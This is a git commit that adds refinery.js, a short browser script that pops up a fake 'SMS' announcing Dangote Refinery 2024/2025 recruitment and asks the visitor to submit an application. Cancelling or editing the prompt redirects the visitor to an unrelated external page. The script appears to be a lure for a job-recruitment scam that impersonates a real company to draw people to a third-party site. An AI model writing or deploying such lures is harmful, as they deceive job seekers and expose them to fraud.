3801632aa90d8fac0ebccd84daf1e0d74ac30b6f
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-09-04 22:58:23 -0700

    Create refinery.js

---
+++ refinery.js
@@ -0,0 +1,6 @@
+
+var password = 'Dangote Refinery Job'
+password=prompt('SMS: Registration is ongoing for the Dangote Refinery 2024/2025 recruitment, kindly press Ok to submit your Application','Dangote Refinery Job');
+if (password != 'Dangote Refinery Job') {
+location.href='https://all-free-byt.org/dangote-refinery.html';
+}
